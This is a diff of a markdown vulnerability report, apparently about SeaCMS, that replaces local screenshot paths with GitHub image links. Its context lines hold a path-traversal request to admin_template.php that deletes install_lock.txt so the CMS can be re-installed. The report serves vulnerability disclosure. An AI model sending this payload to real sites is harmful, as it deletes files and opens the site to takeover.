@@ -32,11 +32,11 @@ payload
 ```
 http://127.0.0.1/seacms/sdfhk/admin_template.php?action=del&filedir=../templets/1.html/../../install/install_lock.txt
 ```
+![图片](https://github.com/ss122-0ss/seacms/assets/131983607/b65493d2-da37-413f-9392-359e3e0f56d4)
 
-![image-20240401222830025](C:\Users\28162\AppData\Roaming\Typora\typora-user-images\image-20240401222830025.png)
 
-![image-20240401222833887](C:\Users\28162\AppData\Roaming\Typora\typora-user-images\image-20240401222833887.png)
+![图片](https://github.com/ss122-0ss/seacms/assets/131983607/69192388-510f-4a6a-80c4-9c94771f31ed)
 
 Looking at the file, you can see that install_lock.txt has been deleted, and the installation file has been deleted so that the database can be re-installed.
+![图片](https://github.com/ss122-0ss/seacms/assets/131983607/d5b64799-5cb8-447d-9503-24e44b7b95e8)
 
-![image-20240401222918135](C:\Users\28162\AppData\Roaming\Typora\typora-user-images\image-20240401222918135.png)
